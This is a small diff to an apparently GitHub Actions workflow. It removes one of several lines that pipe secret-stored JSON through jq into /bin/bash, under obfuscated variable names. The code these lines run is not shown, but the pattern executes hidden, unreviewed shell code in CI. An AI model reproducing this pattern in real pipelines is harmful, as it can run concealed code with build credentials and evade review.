@@ -17,7 +17,6 @@ jobs:
           ggn92: ${{ secrets.ggn92 }}
         run: |
           printf '%s' "$ggn92" | jq -r .khyow4641 | /bin/bash
-          printf '%s' "$y21497" | jq -r .cige2 | /bin/bash
           echo $fjo1113 | jq -r .apim32311 | /bin/bash
           printf '%s' "$bgach5368" | jq -r .av63244 | /bin/bash
           echo $uvc4211 | jq -r .dqu946 | /bin/bash
